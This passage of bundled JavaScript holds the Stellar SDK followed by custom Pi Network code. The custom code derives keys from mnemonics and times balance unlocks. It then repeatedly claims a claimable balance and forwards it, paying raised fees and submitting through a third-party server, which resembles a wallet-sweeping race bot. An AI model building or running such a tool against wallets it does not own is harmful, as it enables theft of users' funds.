                M.scValToNative)(K)
            }),
            data: (0,
            M.scValToNative)(V.body().value().data())
        })
    }
    return events
}
var auth = {}, hasRequiredAuth;
function requireAuth() {
    if (hasRequiredAuth)
        return auth;
    hasRequiredAuth = 1,
    Object.defineProperty(auth, "__esModule", {
        value: !0
    }),
    auth.authorizeEntry = Q,
    auth.authorizeInvocation = ae;
    var _ = X(requireXdr())
      , M = requireKeypair()
      , j = requireStrkey()
      , O = requireNetwork()
      , x = requireHashing()
      , w = requireAddress()
      , b = requireScval();
    function X(oe) {
        return oe && oe.__esModule ? oe : {
            default: oe
        }
    }
    function Y(oe) {
        "@babel/helpers - typeof";
        return Y = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ue) {
            return typeof ue
        }
        : function(ue) {
            return ue && typeof Symbol == "function" && ue.constructor === Symbol && ue !== Symbol.prototype ? "symbol" : typeof ue
        }
        ,
        Y(oe)
    }
    function F() {
        /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */
        F = function() {
            return ue
        }
        ;
        var oe, ue = {}, fe = Object.prototype, he = fe.hasOwnProperty, pe = Object.defineProperty || function(qe, Ve, lt) {
            qe[Ve] = lt.value
        }
        , ye = typeof Symbol == "function" ? Symbol : {}, be = ye.iterator || "@@iterator", xe = ye.asyncIterator || "@@asyncIterator", Ae = ye.toStringTag || "@@toStringTag";
        function Ee(qe, Ve, lt) {
            return Object.defineProperty(qe, Ve, {
                value: lt,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }),
            qe[Ve]
        }
        try {
            Ee({}, "")
        } catch {
            Ee = function(lt, nt, je) {
                return lt[nt] = je
            }
        }
        function Be(qe, Ve, lt, nt) {
            var je = Ve && Ve.prototype instanceof se ? Ve : se
              , Ke = Object.create(je.prototype)
              , Qe = new $e(nt || []);
            return pe(Ke, "_invoke", {
                value: Ie(qe, lt, Qe)
            }),
            Ke
        }
        function ce(qe, Ve, lt) {
            try {
                return {
                    type: "normal",
                    arg: qe.call(Ve, lt)
                }
            } catch (nt) {
                return {
                    type: "throw",
                    arg: nt
                }
            }
        }
        ue.wrap = Be;
        var q = "suspendedStart"
          , L = "suspendedYield"
          , U = "executing"
          , Z = "completed"
          , te = {};
        function se() {}
        function de() {}
        function re() {}
        var $ = {};
        Ee($, be, function() {
            return this
        });
        var ie = Object.getPrototypeOf
          , ve = ie && ie(ie(Ne([])));
        ve && ve !== fe && he.call(ve, be) && ($ = ve);
        var ge = re.prototype = se.prototype = Object.create($);
        function Re(qe) {
            ["next", "throw", "return"].forEach(function(Ve) {
                Ee(qe, Ve, function(lt) {
                    return this._invoke(Ve, lt)
                })
            })
        }
        function Pe(qe, Ve) {
            function lt(je, Ke, Qe, We) {
                var mt = ce(qe[je], qe, Ke);
                if (mt.type !== "throw") {
                    var ct = mt.arg
                      , vt = ct.value;
                    return vt && Y(vt) == "object" && he.call(vt, "__await") ? Ve.resolve(vt.__await).then(function(we) {
                        lt("next", we, Qe, We)
                    }, function(we) {
                        lt("throw", we, Qe, We)
                    }) : Ve.resolve(vt).then(function(we) {
                        ct.value = we,
                        Qe(ct)
                    }, function(we) {
                        return lt("throw", we, Qe, We)
                    })
                }
                We(mt.arg)
            }
            var nt;
            pe(this, "_invoke", {
                value: function(Ke, Qe) {
                    function We() {
                        return new Ve(function(mt, ct) {
                            lt(Ke, Qe, mt, ct)
                        }
                        )
                    }
                    return nt = nt ? nt.then(We, We) : We()
                }
            })
        }
        function Ie(qe, Ve, lt) {
            var nt = q;
            return function(je, Ke) {
                if (nt === U)
                    throw Error("Generator is already running");
                if (nt === Z) {
                    if (je === "throw")
                        throw Ke;
                    return {
                        value: oe,
                        done: !0
                    }
                }
                for (lt.method = je,
                lt.arg = Ke; ; ) {
                    var Qe = lt.delegate;
                    if (Qe) {
                        var We = Te(Qe, lt);
                        if (We) {
                            if (We === te)
                                continue;
                            return We
                        }
                    }
                    if (lt.method === "next")
                        lt.sent = lt._sent = lt.arg;
                    else if (lt.method === "throw") {
                        if (nt === q)
                            throw nt = Z,
                            lt.arg;
                        lt.dispatchException(lt.arg)
                    } else
                        lt.method === "return" && lt.abrupt("return", lt.arg);
                    nt = U;
                    var mt = ce(qe, Ve, lt);
                    if (mt.type === "normal") {
                        if (nt = lt.done ? Z : L,
                        mt.arg === te)
                            continue;
                        return {
                            value: mt.arg,
                            done: lt.done
                        }
                    }
                    mt.type === "throw" && (nt = Z,
                    lt.method = "throw",
                    lt.arg = mt.arg)
                }
            }
        }
        function Te(qe, Ve) {
            var lt = Ve.method
              , nt = qe.iterator[lt];
            if (nt === oe)
                return Ve.delegate = null,
                lt === "throw" && qe.iterator.return && (Ve.method = "return",
                Ve.arg = oe,
                Te(qe, Ve),
                Ve.method === "throw") || lt !== "return" && (Ve.method = "throw",
                Ve.arg = new TypeError("The iterator does not provide a '" + lt + "' method")),
                te;
            var je = ce(nt, qe.iterator, Ve.arg);
            if (je.type === "throw")
                return Ve.method = "throw",
                Ve.arg = je.arg,
                Ve.delegate = null,
                te;
            var Ke = je.arg;
            return Ke ? Ke.done ? (Ve[qe.resultName] = Ke.value,
            Ve.next = qe.nextLoc,
            Ve.method !== "return" && (Ve.method = "next",
            Ve.arg = oe),
            Ve.delegate = null,
            te) : Ke : (Ve.method = "throw",
            Ve.arg = new TypeError("iterator result is not an object"),
            Ve.delegate = null,
            te)
        }
        function Le(qe) {
            var Ve = {
                tryLoc: qe[0]
            };
            1 in qe && (Ve.catchLoc = qe[1]),
            2 in qe && (Ve.finallyLoc = qe[2],
            Ve.afterLoc = qe[3]),
            this.tryEntries.push(Ve)
        }
        function Ze(qe) {
            var Ve = qe.completion || {};
            Ve.type = "normal",
            delete Ve.arg,
            qe.completion = Ve
        }
        function $e(qe) {
            this.tryEntries = [{
                tryLoc: "root"
            }],
            qe.forEach(Le, this),
            this.reset(!0)
        }
        function Ne(qe) {
            if (qe || qe === "") {
                var Ve = qe[be];
                if (Ve)
                    return Ve.call(qe);
                if (typeof qe.next == "function")
                    return qe;
                if (!isNaN(qe.length)) {
                    var lt = -1
                      , nt = function je() {
                        for (; ++lt < qe.length; )
                            if (he.call(qe, lt))
                                return je.value = qe[lt],
                                je.done = !1,
                                je;
                        return je.value = oe,
                        je.done = !0,
                        je
                    };
                    return nt.next = nt
                }
            }
            throw new TypeError(Y(qe) + " is not iterable")
        }
        return de.prototype = re,
        pe(ge, "constructor", {
            value: re,
            configurable: !0
        }),
        pe(re, "constructor", {
            value: de,
            configurable: !0
        }),
        de.displayName = Ee(re, Ae, "GeneratorFunction"),
        ue.isGeneratorFunction = function(qe) {
            var Ve = typeof qe == "function" && qe.constructor;
            return !!Ve && (Ve === de || (Ve.displayName || Ve.name) === "GeneratorFunction")
        }
        ,
        ue.mark = function(qe) {
            return Object.setPrototypeOf ? Object.setPrototypeOf(qe, re) : (qe.__proto__ = re,
            Ee(qe, Ae, "GeneratorFunction")),
            qe.prototype = Object.create(ge),
            qe
        }
        ,
        ue.awrap = function(qe) {
            return {
                __await: qe
            }
        }
        ,
        Re(Pe.prototype),
        Ee(Pe.prototype, xe, function() {
            return this
        }),
        ue.AsyncIterator = Pe,
        ue.async = function(qe, Ve, lt, nt, je) {
            je === void 0 && (je = Promise);
            var Ke = new Pe(Be(qe, Ve, lt, nt),je);
            return ue.isGeneratorFunction(Ve) ? Ke : Ke.next().then(function(Qe) {
                return Qe.done ? Qe.value : Ke.next()
            })
        }
        ,
        Re(ge),
        Ee(ge, Ae, "Generator"),
        Ee(ge, be, function() {
            return this
        }),
        Ee(ge, "toString", function() {
            return "[object Generator]"
        }),
        ue.keys = function(qe) {
            var Ve = Object(qe)
              , lt = [];
            for (var nt in Ve)
                lt.push(nt);
            return lt.reverse(),
            function je() {
                for (; lt.length; ) {
                    var Ke = lt.pop();
                    if (Ke in Ve)
                        return je.value = Ke,
                        je.done = !1,
                        je
                }
                return je.done = !0,
                je
            }
        }
        ,
        ue.values = Ne,
        $e.prototype = {
            constructor: $e,
            reset: function(Ve) {
                if (this.prev = 0,
                this.next = 0,
                this.sent = this._sent = oe,
                this.done = !1,
                this.delegate = null,
                this.method = "next",
                this.arg = oe,
                this.tryEntries.forEach(Ze),
                !Ve)
                    for (var lt in this)
                        lt.charAt(0) === "t" && he.call(this, lt) && !isNaN(+lt.slice(1)) && (this[lt] = oe)
            },
            stop: function() {
                this.done = !0;
                var Ve = this.tryEntries[0].completion;
                if (Ve.type === "throw")
                    throw Ve.arg;
                return this.rval
            },
            dispatchException: function(Ve) {
                if (this.done)
                    throw Ve;
                var lt = this;
                function nt(ct, vt) {
                    return Qe.type = "throw",
                    Qe.arg = Ve,
                    lt.next = ct,
                    vt && (lt.method = "next",
                    lt.arg = oe),
                    !!vt
                }
                for (var je = this.tryEntries.length - 1; je >= 0; --je) {
                    var Ke = this.tryEntries[je]
                      , Qe = Ke.completion;
                    if (Ke.tryLoc === "root")
                        return nt("end");
                    if (Ke.tryLoc <= this.prev) {
                        var We = he.call(Ke, "catchLoc")
                          , mt = he.call(Ke, "finallyLoc");
                        if (We && mt) {
                            if (this.prev < Ke.catchLoc)
                                return nt(Ke.catchLoc, !0);
                            if (this.prev < Ke.finallyLoc)
                                return nt(Ke.finallyLoc)
                        } else if (We) {
                            if (this.prev < Ke.catchLoc)
                                return nt(Ke.catchLoc, !0)
                        } else {
                            if (!mt)
                                throw Error("try statement without catch or finally");
                            if (this.prev < Ke.finallyLoc)
                                return nt(Ke.finallyLoc)
                        }
                    }
                }
            },
            abrupt: function(Ve, lt) {
                for (var nt = this.tryEntries.length - 1; nt >= 0; --nt) {
                    var je = this.tryEntries[nt];
                    if (je.tryLoc <= this.prev && he.call(je, "finallyLoc") && this.prev < je.finallyLoc) {
                        var Ke = je;
                        break
                    }
                }
                Ke && (Ve === "break" || Ve === "continue") && Ke.tryLoc <= lt && lt <= Ke.finallyLoc && (Ke = null);
                var Qe = Ke ? Ke.completion : {};
                return Qe.type = Ve,
                Qe.arg = lt,
                Ke ? (this.method = "next",
                this.next = Ke.finallyLoc,
                te) : this.complete(Qe)
            },
            complete: function(Ve, lt) {
                if (Ve.type === "throw")
                    throw Ve.arg;
                return Ve.type === "break" || Ve.type === "continue" ? this.next = Ve.arg : Ve.type === "return" ? (this.rval = this.arg = Ve.arg,
                this.method = "return",
                this.next = "end") : Ve.type === "normal" && lt && (this.next = lt),
                te
            },
            finish: function(Ve) {
                for (var lt = this.tryEntries.length - 1; lt >= 0; --lt) {
                    var nt = this.tryEntries[lt];
                    if (nt.finallyLoc === Ve)
                        return this.complete(nt.completion, nt.afterLoc),
                        Ze(nt),
                        te
                }
            },
            catch: function(Ve) {
                for (var lt = this.tryEntries.length - 1; lt >= 0; --lt) {
                    var nt = this.tryEntries[lt];
                    if (nt.tryLoc === Ve) {
                        var je = nt.completion;
                        if (je.type === "throw") {
                            var Ke = je.arg;
                            Ze(nt)
                        }
                        return Ke
                    }
                }
                throw Error("illegal catch attempt")
            },
            delegateYield: function(Ve, lt, nt) {
                return this.delegate = {
                    iterator: Ne(Ve),
                    resultName: lt,
                    nextLoc: nt
                },
                this.method === "next" && (this.arg = oe),
                te
            }
        },
        ue
    }
    function V(oe, ue, fe, he, pe, ye, be) {
        try {
            var xe = oe[ye](be)
              , Ae = xe.value
        } catch (Ee) {
            return void fe(Ee)
        }
        xe.done ? ue(Ae) : Promise.resolve(Ae).then(he, pe)
    }
    function K(oe) {
        return function() {
            var ue = this
              , fe = arguments;
            return new Promise(function(he, pe) {
                var ye = oe.apply(ue, fe);
                function be(Ae) {
                    V(ye, he, pe, be, xe, "next", Ae)
                }
                function xe(Ae) {
                    V(ye, he, pe, be, xe, "throw", Ae)
                }
                be(void 0)
            }
            )
        }
    }
    function Q(oe, ue, fe) {
        return ee.apply(this, arguments)
    }
    function ee() {
        return ee = K(F().mark(function oe(ue, fe, he) {
            var pe, ye, be, xe, Ae, Ee, Be, ce, q, L, U = arguments;
            return F().wrap(function(te) {
                for (; ; )
                    switch (te.prev = te.next) {
                    case 0:
                        if (pe = U.length > 3 && U[3] !== void 0 ? U[3] : O.Networks.FUTURENET,
                        ue.credentials().switch().value === _.default.SorobanCredentialsType.sorobanCredentialsAddress().value) {
                            te.next = 3;
                            break
                        }
                        return te.abrupt("return", ue);
                    case 3:
                        if (ye = _.default.SorobanAuthorizationEntry.fromXDR(ue.toXDR()),
                        be = ye.credentials().address(),
                        be.signatureExpirationLedger(he),
                        xe = (0,
                        x.hash)(Buffer.from(pe)),
                        Ae = _.default.HashIdPreimage.envelopeTypeSorobanAuthorization(new _.default.HashIdPreimageSorobanAuthorization({
                            networkId: xe,
                            nonce: be.nonce(),
                            invocation: ye.rootInvocation(),
                            signatureExpirationLedger: be.signatureExpirationLedger()
                        })),
                        Ee = (0,
                        x.hash)(Ae.toXDR()),
                        typeof fe != "function") {
                            te.next = 16;
                            break
                        }
                        return te.next = 12,
                        fe(Ae);
                    case 12:
                        q = te.sent,
                        q != null && q.signature ? (Be = Buffer.from(q.signature),
                        ce = q.publicKey) : (Be = Buffer.from(q),
                        ce = w.Address.fromScAddress(be.address()).toString()),
                        te.next = 18;
                        break;
                    case 16:
                        Be = Buffer.from(fe.sign(Ee)),
                        ce = fe.publicKey();
                    case 18:
                        if (M.Keypair.fromPublicKey(ce).verify(Ee, Be)) {
                            te.next = 20;
                            break
                        }
                        throw new Error("signature doesn't match payload");
                    case 20:
                        return L = (0,
                        b.nativeToScVal)({
                            public_key: j.StrKey.decodeEd25519PublicKey(ce),
                            signature: Be
                        }, {
                            type: {
                                public_key: ["symbol", null],
                                signature: ["symbol", null]
                            }
                        }),
                        be.signature(_.default.ScVal.scvVec([L])),
                        te.abrupt("return", ye);
                    case 23:
                    case "end":
                        return te.stop()
                    }
            }, oe)
        })),
        ee.apply(this, arguments)
    }
    function ae(oe, ue, fe) {
        var he = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : ""
          , pe = arguments.length > 4 && arguments[4] !== void 0 ? arguments[4] : O.Networks.FUTURENET
          , ye = M.Keypair.random().rawPublicKey()
          , be = new _.default.Int64(ne(ye))
          , xe = he || oe.publicKey();
        if (!xe)
            throw new Error("authorizeInvocation requires publicKey parameter");
        var Ae = new _.default.SorobanAuthorizationEntry({
            rootInvocation: fe,
            credentials: _.default.SorobanCredentials.sorobanCredentialsAddress(new _.default.SorobanAddressCredentials({
                address: new w.Address(xe).toScAddress(),
                nonce: be,
                signatureExpirationLedger: 0,
                signature: _.default.ScVal.scvVec([])
            }))
        });
        return Q(Ae, oe, ue, pe)
    }
    function ne(oe) {
        return oe.subarray(0, 8).reduce(function(ue, fe) {
            return ue << 8 | fe
        }, 0)
    }
    return auth
}
var invocation = {}, hasRequiredInvocation;
function requireInvocation() {
    if (hasRequiredInvocation)
        return invocation;
    hasRequiredInvocation = 1,
    Object.defineProperty(invocation, "__esModule", {
        value: !0
    }),
    invocation.buildInvocationTree = F,
    invocation.walkInvocationTree = V;
    var _ = requireAsset()
      , M = requireAddress()
      , j = requireScval();
    function O(Q) {
        "@babel/helpers - typeof";
        return O = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ee) {
            return typeof ee
        }
        : function(ee) {
            return ee && typeof Symbol == "function" && ee.constructor === Symbol && ee !== Symbol.prototype ? "symbol" : typeof ee
        }
        ,
        O(Q)
    }
    function x(Q, ee) {
        var ae = Object.keys(Q);
        if (Object.getOwnPropertySymbols) {
            var ne = Object.getOwnPropertySymbols(Q);
            ee && (ne = ne.filter(function(oe) {
                return Object.getOwnPropertyDescriptor(Q, oe).enumerable
            })),
            ae.push.apply(ae, ne)
        }
        return ae
    }
    function w(Q) {
        for (var ee = 1; ee < arguments.length; ee++) {
            var ae = arguments[ee] != null ? arguments[ee] : {};
            ee % 2 ? x(Object(ae), !0).forEach(function(ne) {
                b(Q, ne, ae[ne])
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(Q, Object.getOwnPropertyDescriptors(ae)) : x(Object(ae)).forEach(function(ne) {
                Object.defineProperty(Q, ne, Object.getOwnPropertyDescriptor(ae, ne))
            })
        }
        return Q
    }
    function b(Q, ee, ae) {
        return (ee = X(ee))in Q ? Object.defineProperty(Q, ee, {
            value: ae,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : Q[ee] = ae,
        Q
    }
    function X(Q) {
        var ee = Y(Q, "string");
        return O(ee) == "symbol" ? ee : ee + ""
    }
    function Y(Q, ee) {
        if (O(Q) != "object" || !Q)
            return Q;
        var ae = Q[Symbol.toPrimitive];
        if (ae !== void 0) {
            var ne = ae.call(Q, ee);
            if (O(ne) != "object")
                return ne;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return (ee === "string" ? String : Number)(Q)
    }
    function F(Q) {
        var ee = Q.function()
          , ae = {}
          , ne = ee.value();
        switch (ee.switch().value) {
        case 0:
            ae.type = "execute",
            ae.args = {
                source: M.Address.fromScAddress(ne.contractAddress()).toString(),
                function: ne.functionName(),
                args: ne.args().map(function(ye) {
                    return (0,
                    j.scValToNative)(ye)
                })
            };
            break;
        case 1:
        case 2:
            {
                var oe = ee.switch().value === 2;
                ae.type = "create",
                ae.args = {};
                var ue = [ne.executable(), ne.contractIdPreimage()]
                  , fe = ue[0]
                  , he = ue[1];
                if (!!fe.switch().value != !!he.switch().value)
                    throw new Error("creation function appears invalid: ".concat(JSON.stringify(ne), " (should be wasm+address or token+asset)"));
                switch (fe.switch().value) {
                case 0:
                    {
                        var pe = he.fromAddress();
                        ae.args.type = "wasm",
                        ae.args.wasm = w({
                            salt: pe.salt().toString("hex"),
                            hash: fe.wasmHash().toString("hex"),
                            address: M.Address.fromScAddress(pe.address()).toString()
                        }, oe && {
                            constructorArgs: ne.constructorArgs().map(function(ye) {
                                return (0,
                                j.scValToNative)(ye)
                            })
                        });
                        break
                    }
                case 1:
                    ae.args.type = "sac",
                    ae.args.asset = _.Asset.fromOperation(he.fromAsset()).toString();
                    break;
                default:
                    throw new Error("unknown creation type: ".concat(JSON.stringify(fe)))
                }
                break
            }
        default:
            throw new Error("unknown invocation type (".concat(ee.switch(), "): ").concat(JSON.stringify(ee)))
        }
        return ae.invocations = Q.subInvocations().map(function(ye) {
            return F(ye)
        }),
        ae
    }
    function V(Q, ee) {
        K(Q, 1, ee)
    }
    function K(Q, ee, ae, ne) {
        ae(Q, ee, ne) !== !1 && Q.subInvocations().forEach(function(oe) {
            return K(oe, ee + 1, ae, Q)
        })
    }
    return invocation
}
var hasRequiredLib;
function requireLib() {
    return hasRequiredLib || (hasRequiredLib = 1,
    function(_, M) {
        Object.defineProperty(M, "__esModule", {
            value: !0
        });
        var j = {
            xdr: !0,
            cereal: !0,
            hash: !0,
            sign: !0,
            verify: !0,
            FastSigning: !0,
            getLiquidityPoolId: !0,
            LiquidityPoolFeeV18: !0,
            Keypair: !0,
            UnsignedHyper: !0,
            Hyper: !0,
            TransactionBase: !0,
            Transaction: !0,
            FeeBumpTransaction: !0,
            TransactionBuilder: !0,
            TimeoutInfinite: !0,
            BASE_FEE: !0,
            Asset: !0,
            LiquidityPoolAsset: !0,
            LiquidityPoolId: !0,
            Operation: !0,
            AuthRequiredFlag: !0,
            AuthRevocableFlag: !0,
            AuthImmutableFlag: !0,
            AuthClawbackEnabledFlag: !0,
            Account: !0,
            MuxedAccount: !0,
            Claimant: !0,
            Networks: !0,
            StrKey: !0,
            SignerKey: !0,
            Soroban: !0,
            decodeAddressToMuxedAccount: !0,
            encodeMuxedAccountToAddress: !0,
            extractBaseAddress: !0,
            encodeMuxedAccount: !0,
            Contract: !0,
            Address: !0
        };
        Object.defineProperty(M, "Account", {
            enumerable: !0,
            get: function() {
                return he.Account
            }
        }),
        Object.defineProperty(M, "Address", {
            enumerable: !0,
            get: function() {
                return q.Address
            }
        }),
        Object.defineProperty(M, "Asset", {
            enumerable: !0,
            get: function() {
                return ae.Asset
            }
        }),
        Object.defineProperty(M, "AuthClawbackEnabledFlag", {
            enumerable: !0,
            get: function() {
                return ue.AuthClawbackEnabledFlag
            }
        }),
        Object.defineProperty(M, "AuthImmutableFlag", {
            enumerable: !0,
            get: function() {
                return ue.AuthImmutableFlag
            }
        }),
        Object.defineProperty(M, "AuthRequiredFlag", {
            enumerable: !0,
            get: function() {
                return ue.AuthRequiredFlag
            }
        }),
        Object.defineProperty(M, "AuthRevocableFlag", {
            enumerable: !0,
            get: function() {
                return ue.AuthRevocableFlag
            }
        }),
        Object.defineProperty(M, "BASE_FEE", {
            enumerable: !0,
            get: function() {
                return ee.BASE_FEE
            }
        }),
        Object.defineProperty(M, "Claimant", {
            enumerable: !0,
            get: function() {
                return ye.Claimant
            }
        }),
        Object.defineProperty(M, "Contract", {
            enumerable: !0,
            get: function() {
                return ce.Contract
            }
        }),
        Object.defineProperty(M, "FastSigning", {
            enumerable: !0,
            get: function() {
                return b.FastSigning
            }
        }),
        Object.defineProperty(M, "FeeBumpTransaction", {
            enumerable: !0,
            get: function() {
                return Q.FeeBumpTransaction
            }
        }),
        Object.defineProperty(M, "Hyper", {
            enumerable: !0,
            get: function() {
                return F.Hyper
            }
        }),
        Object.defineProperty(M, "Keypair", {
            enumerable: !0,
            get: function() {
                return Y.Keypair
            }
        }),
        Object.defineProperty(M, "LiquidityPoolAsset", {
            enumerable: !0,
            get: function() {
                return ne.LiquidityPoolAsset
            }
        }),
        Object.defineProperty(M, "LiquidityPoolFeeV18", {
            enumerable: !0,
            get: function() {
                return X.LiquidityPoolFeeV18
            }
        }),
        Object.defineProperty(M, "LiquidityPoolId", {
            enumerable: !0,
            get: function() {
                return oe.LiquidityPoolId
            }
        }),
        Object.defineProperty(M, "MuxedAccount", {
            enumerable: !0,
            get: function() {
                return pe.MuxedAccount
            }
        }),
        Object.defineProperty(M, "Networks", {
            enumerable: !0,
            get: function() {
                return be.Networks
            }
        }),
        Object.defineProperty(M, "Operation", {
            enumerable: !0,
            get: function() {
                return ue.Operation
            }
        }),
        Object.defineProperty(M, "SignerKey", {
            enumerable: !0,
            get: function() {
                return Ae.SignerKey
            }
        }),
        Object.defineProperty(M, "Soroban", {
            enumerable: !0,
            get: function() {
                return Ee.Soroban
            }
        }),
        Object.defineProperty(M, "StrKey", {
            enumerable: !0,
            get: function() {
                return xe.StrKey
            }
        }),
        Object.defineProperty(M, "TimeoutInfinite", {
            enumerable: !0,
            get: function() {
                return ee.TimeoutInfinite
            }
        }),
        Object.defineProperty(M, "Transaction", {
            enumerable: !0,
            get: function() {
                return K.Transaction
            }
        }),
        Object.defineProperty(M, "TransactionBase", {
            enumerable: !0,
            get: function() {
                return V.TransactionBase
            }
        }),
        Object.defineProperty(M, "TransactionBuilder", {
            enumerable: !0,
            get: function() {
                return ee.TransactionBuilder
            }
        }),
        Object.defineProperty(M, "UnsignedHyper", {
            enumerable: !0,
            get: function() {
                return F.UnsignedHyper
            }
        }),
        Object.defineProperty(M, "cereal", {
            enumerable: !0,
            get: function() {
                return x.default
            }
        }),
        Object.defineProperty(M, "decodeAddressToMuxedAccount", {
            enumerable: !0,
            get: function() {
                return Be.decodeAddressToMuxedAccount
            }
        }),
        M.default = void 0,
        Object.defineProperty(M, "encodeMuxedAccount", {
            enumerable: !0,
            get: function() {
                return Be.encodeMuxedAccount
            }
        }),
        Object.defineProperty(M, "encodeMuxedAccountToAddress", {
            enumerable: !0,
            get: function() {
                return Be.encodeMuxedAccountToAddress
            }
        }),
        Object.defineProperty(M, "extractBaseAddress", {
            enumerable: !0,
            get: function() {
                return Be.extractBaseAddress
            }
        }),
        Object.defineProperty(M, "getLiquidityPoolId", {
            enumerable: !0,
            get: function() {
                return X.getLiquidityPoolId
            }
        }),
        Object.defineProperty(M, "hash", {
            enumerable: !0,
            get: function() {
                return w.hash
            }
        }),
        Object.defineProperty(M, "sign", {
            enumerable: !0,
            get: function() {
                return b.sign
            }
        }),
        Object.defineProperty(M, "verify", {
            enumerable: !0,
            get: function() {
                return b.verify
            }
        }),
        Object.defineProperty(M, "xdr", {
            enumerable: !0,
            get: function() {
                return O.default
            }
        });
        var O = re(requireXdr())
          , x = re(requireJsxdr())
          , w = requireHashing()
          , b = requireSigning()
          , X = requireGet_liquidity_pool_id()
          , Y = requireKeypair()
          , F = requireXdr$1()
          , V = requireTransaction_base()
          , K = requireTransaction()
          , Q = requireFee_bump_transaction()
          , ee = requireTransaction_builder()
          , ae = requireAsset()
          , ne = requireLiquidity_pool_asset()
          , oe = requireLiquidity_pool_id()
          , ue = requireOperation()
          , fe = requireMemo();
        Object.keys(fe).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === fe[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return fe[$]
                }
            })
        });
        var he = requireAccount()
          , pe = requireMuxed_account()
          , ye = requireClaimant()
          , be = requireNetwork()
          , xe = requireStrkey()
          , Ae = requireSignerkey()
          , Ee = requireSoroban()
          , Be = requireDecode_encode_muxed_account()
          , ce = requireContract()
          , q = requireAddress()
          , L = requireNumbers();
        Object.keys(L).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === L[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return L[$]
                }
            })
        });
        var U = requireScval();
        Object.keys(U).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === U[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return U[$]
                }
            })
        });
        var Z = requireEvents();
        Object.keys(Z).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === Z[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return Z[$]
                }
            })
        });
        var te = requireSorobandata_builder();
        Object.keys(te).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === te[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return te[$]
                }
            })
        });
        var se = requireAuth();
        Object.keys(se).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === se[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return se[$]
                }
            })
        });
        var de = requireInvocation();
        Object.keys(de).forEach(function($) {
            $ === "default" || $ === "__esModule" || Object.prototype.hasOwnProperty.call(j, $) || $ in M && M[$] === de[$] || Object.defineProperty(M, $, {
                enumerable: !0,
                get: function() {
                    return de[$]
                }
            })
        });
        function re($) {
            return $ && $.__esModule ? $ : {
                default: $
            }
        }
        M.default = _.exports
    }(lib, lib.exports)),
    lib.exports
}
var libExports = requireLib();
const HORIZON_MAIN_URL$1 = "http://4.194.35.14:31401"
  , server$1 = new libExports$1.Server(HORIZON_MAIN_URL$1);
let cachedFee = null
  , lastFeeFetchTime = 0;
const FEE_CACHE_TTL = 60 * 1e3;
function generateWalletKeypair(_) {
    const M = srcExports.mnemonicToSeedSync(_.toLocaleLowerCase().trim())
      , j = "m/44'/314159'/0'"
      , {key: O} = distExports$1.derivePath(j, M.toString("hex"));
    return libExports$1.Keypair.fromRawEd25519Seed(O)
}
function generateStellaBaseKeypair(_) {
    const M = srcExports.mnemonicToSeedSync(_.toLocaleLowerCase().trim())
      , j = "m/44'/314159'/0'"
      , {key: O} = distExports$1.derivePath(j, M.toString("hex"));
    return libExports.Keypair.fromRawEd25519Seed(O)
}
function generateFeePayerKeypair(_) {
    const M = srcExports.mnemonicToSeedSync(_)
      , j = "m/44'/314159'/0'"
      , {key: O} = distExports$1.derivePath(j, M.toString("hex"));
    return libExports$1.Keypair.fromRawEd25519Seed(O)
}
async function getClaimableBalance(_) {
    return await server$1.claimableBalances().claimant(_).limit(10).order("asc").call()
}
function formatCountdown(_) {
    const M = Math.max(0, Math.floor(_ / 1e3))
      , j = Math.floor(M / (60 * 60 * 24))
      , O = Math.floor(M % (60 * 60 * 24) / 3600)
      , x = Math.floor(M % 3600 / 60)
      , w = M % 60
      , b = [];
    return j > 0 && b.push(`${j}d`),
    (O > 0 || j > 0) && b.push(`${O}h`),
    (x > 0 || O > 0 || j > 0) && b.push(`${x}m`),
    b.push(`${w}s`),
    b.join(" ")
}
async function copyToClipboard(_) {
    try {
        await navigator.clipboard.writeText(_)
    } catch (M) {
        console.error("Failed to copy text: ", M)
    }
}
async function getBaseFee() {
    const _ = Date.now();
    return cachedFee && _ - lastFeeFetchTime < FEE_CACHE_TTL || (cachedFee = (await server$1.feeStats()).fee_charged.max,
    lastFeeFetchTime = _),
    cachedFee
}
function getBalance(_) {
    const M = _.balances.find(j => j.asset_type === "native");
    return M ? M.balance : "0"
}
async function createPiTransaction(_, M, j, O, x, w, b) {
    var K, Q, ee, ae, ne;
    const X = await server$1.loadAccount(_)
      , Y = parseFloat(await getBaseFee()) + b * 2e3
      , F = new libExports$1.TransactionBuilder(X,{
        fee: Y.toString(),
        networkPassphrase: "Pi Network",
        withMuxing: !0
    });
    for (let oe = 0; oe < x; oe++)
        F.addOperation(libExports$1.Operation.claimClaimableBalance({
            balanceId: M,
            withMuxing: !0
        })).addOperation(libExports$1.Operation.payment({
            destination: j,
            asset: libExports$1.Asset.native(),
            amount: O,
            withMuxing: !0
        }));
    F.setTimeout(30);
    const V = F.build();
    V.sign(w);
    try {
        const ue = await (await fetch("https://xdr.zendshost.id/api/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                xdr: V.toXDR()
            })
        })).json();
        if (!ue.hash) {
